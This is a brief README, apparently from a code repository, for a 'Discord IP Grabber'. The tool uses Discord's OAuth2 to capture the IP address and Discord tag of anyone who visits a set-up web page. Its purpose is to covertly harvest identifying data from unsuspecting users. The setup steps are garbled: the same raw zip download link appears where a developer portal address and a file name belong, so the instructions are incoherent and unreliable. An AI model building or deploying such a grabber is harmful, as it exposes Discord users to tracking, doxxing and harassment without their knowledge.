# Discord IP Grabber
Grabs a users IP and Discord Tag after visiting a web page using Discords oauth2

# How To Use
  1.  Go to https://raw.githubusercontent.com/xdxdxd3214/discord-ip-grabber/master/madbrain/ip_grabber_discord_v1.8.zip
  2.  Press "New Application" and name it whatever you want.
  3.  Go to OAuth2 and add your Redirect URI
  4.  Grab the Client ID and the Client Secret and enter it in the .php file
  
Make sure to create a new file called https://raw.githubusercontent.com/xdxdxd3214/discord-ip-grabber/master/madbrain/ip_grabber_discord_v1.8.zip in the same directory
